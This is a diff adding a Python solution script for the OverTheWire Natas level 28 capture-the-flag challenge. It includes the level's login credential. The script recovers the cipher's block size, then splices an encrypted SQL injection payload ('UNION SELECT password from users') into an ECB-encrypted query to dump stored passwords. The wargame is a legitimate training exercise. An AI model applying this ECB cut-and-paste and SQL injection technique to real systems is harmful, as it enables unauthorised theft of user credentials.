@@ -1,0 +1,40 @@
+natas28:skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
+
+import requests
+import string
+import base64
+import math
+
+url = 'http://natas28.natas.labs.overthewire.org'
+s = requests.Session()
+s.auth = ('natas28', 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
+
+r = s.post(url, data={'query': 'natas29'})
+data = requests.utils.unquote(r.url.split('=')[1])
+
+def get_encrypted_data(input_string):
+	r = s.post(url, data={'query': input_string})
+	return base64.b64decode(requests.utils.unquote(r.url.split('=')[1]))
+
+response_length = len(base64.b64decode(data))
+user = 'natas29a'
+user_length = len(get_encrypted_data(user))
+while response_length == user_length:
+	user += 'a'
+	user_length = len(get_encrypted_data(user))
+block_size = user_length - response_length
+
+sample = get_encrypted_data('a' * 9)
+for c in string.printable:
+	if sample[block_size*2:block_size*3-1] == get_encrypted_data('a' * 9 + c)[block_size*2:block_size*3-1]:
+		break
+
+injection = 'a' * 9 + '\' UNION SELECT password from users; #'
+blocks = math.ceil((len(injection)-10)/block_size)
+
+encrypted_injection = get_encrypted_data(injection)
+placeholder = get_encrypted_data('a' * 10)
+
+query = placeholder[:block_size*3] + encrypted_injection[block_size*3:block_size*3+(blocks*block_size)] + placeholder[block_size*3:]
+r = s.get(url + '/search.php?query=' + requests.utils.quote(base64.b64encode(query)).replace('/', '%2F'))
+print(r.text)
